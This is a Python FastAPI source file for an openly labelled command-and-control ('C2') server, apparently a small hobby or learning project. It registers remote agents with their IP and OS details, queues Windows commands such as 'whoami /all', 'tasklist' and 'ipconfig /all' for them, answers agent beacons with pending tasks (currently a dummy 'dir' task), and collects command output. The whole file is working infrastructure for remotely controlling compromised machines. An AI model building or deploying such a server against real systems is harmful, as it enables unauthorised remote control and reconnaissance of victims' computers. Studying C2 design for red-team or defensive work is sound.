import json
import uuid, time, datetime

import uvicorn
from fastapi import FastAPI, HTTPException, Request
from fastapi.templating import Jinja2Templates
from pydantic import BaseModel
from starlette.responses import HTMLResponse, RedirectResponse

app = FastAPI(title="C2 server")

templates = Jinja2Templates(directory="templates")

COMMANDS = {
    "dir": "dir",
    "exit": "exit",
    "list_processes": "tasklist",
    "whoami": "whoami /all",
    "ipconfig": "ipconfig /all"
}


class AgentDetails(BaseModel):
    agent_id: str
    name: str
    ip_addr: str
    # port: int
    os_info: str
    last_seen: float


class TaskDetails(BaseModel):
    id: str
    agent_id: str
    command: str
    status: str = "pending"


class TaskResult(BaseModel):
    id: str
    agent_id: str
    task_id: str
    output: str
    result_status: int


agentsList = {}
tasksList = {}
resultsList = {}


def get_agent_status(agent):
    return "active" if (time.time() - agent.last_seen) < 120 else "inactive"


def get_readable_time(timestamp):
    return datetime.datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')


@app.get("/", response_class=HTMLResponse)
async def root(request: Request):
    """Homepage of the C2 server."""
    agents = []
    for agent_id, agent in agentsList.items():
        agent_data = agent.dict()
        agent_data["status"] = get_agent_status(agent)
        agent_data["last_seen_readable"] = get_readable_time(agent.last_seen)
        agents.append(agent_data)

    return templates.TemplateResponse("index.html", {"request": request, "agents": agents})


@app.get("/agent/{agent_id}")
async def agent_details(request: Request, agent_id: str):
    """Details of specific agent."""
    if agent_id  not in agentsList:
        return RedirectResponse(url="/", status_code=404)

    return {"agent_id": agent_id, "agent_details": agentsList[agent_id]}


@app.post("/agentSetup")
async def agent_setup(request: Request):
    agent_id = str(uuid.uuid4())
    info = await request.json()
    agentsList[agent_id] = AgentDetails(
        agent_id=agent_id,
        name=info['name'],
        ip_addr=request.client.host,
        os_info=info['os_info'],
        last_seen=time.time()
    )
    print(f"Agent {agent_id} created! Name being {agentsList[agent_id].name}.")

    # Creating an empty task list for this agent
    tasksList[agent_id] = []

    return {"message": "Agent has been registered successfully!", "agent": agentsList[agent_id]}


# Create tasks
@app.post("/taskSetup/{agent_id}")
async def task_setup(agent_id: str, request: Request):
    if agent_id not in agentsList:
        print(f"Agent {agent_id} not registered!")
        raise HTTPException(status_code=404, detail="Agent not found!")

    info = await request.json()

    task_id = str(uuid.uuid4())
    task = TaskDetails(
        id=task_id,
        agent_id=agent_id,
        command=info['command']
    )

    tasksList[agent_id].append(task)
    print(f"Task {task_id} registered to agent {agent_id}!")
    print(f"Details of tasks for this agent: {tasksList[agent_id]}.")

    return {"message": "Task has been created successfully!", "task": task}


@app.post("/beacon/{agent_id}")
async def beacon(agent_id: str):
    if agent_id not in agentsList:
        print("Invalid agent ID!")
        raise HTTPException(status_code=404, detail="Agent not found!")

    # Update last seen of agent
    agentsList[agent_id].last_seen = time.time()

    # Add tasks
    pending_tasks = [task for task in tasksList[agent_id] if task.status == "pending"]

    # We need to send only task_id and command to agent, since agent_id is not needed to be sent to the agent in this case
    '''
    Send the below JSON:
    {
        [
            {"task_id": <task id>, "command": <command>},
            {"task_id": <task id>, "command": <command>}
            ...
            ...
            ...
        ]
    }
    '''

    send_tasks = [{"task_id": task.id, "command": task.command} for task in pending_tasks]

    # TODO: Update this and remove the dummy setup below
    # This will be sent to the agent when it beacons and if there are any tasks pending
    # return {"tasksList": send_tasks}

    # Dummy tasks setup
    dum1 = {"task_id": str(uuid.uuid4()), "command": COMMANDS["dir"]}

    dummy_list = [dum1]

    return {"tasksList": dummy_list}


@app.get("/agents")
async def get_agents():
    print("List of all agents printed to screen!")
    return {"agents": [agent for agent in agentsList.values()]}


@app.get("/results/{task_id}")
async def view_results(task_id: str):
    if task_id not in resultsList:
        raise HTTPException(status_code=404, detail="Task not found!")
    print(f"Task {task_id} found and is printed to screen!")
    return {"result": resultsList[task_id]}


@app.post("/tasks/result")
async def receive_results(request: Request):
    print("Receiving results from agent!!")

    info = await request.json()

    result_id = str(uuid.uuid4())
    result = TaskResult(
        id=result_id,
        agent_id=info['agent_id'],
        task_id=info['task_id'],
        output=info['output'],
        result_status=1 
    )

    if result.agent_id not in agentsList:
        raise HTTPException(status_code=404, detail="Agent not found!")

    resultsList[result_id] = result
    print(f"Details of results for {result_id}: {resultsList[result_id]}.")
    return {"result": "success"}


if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000, reload=True)
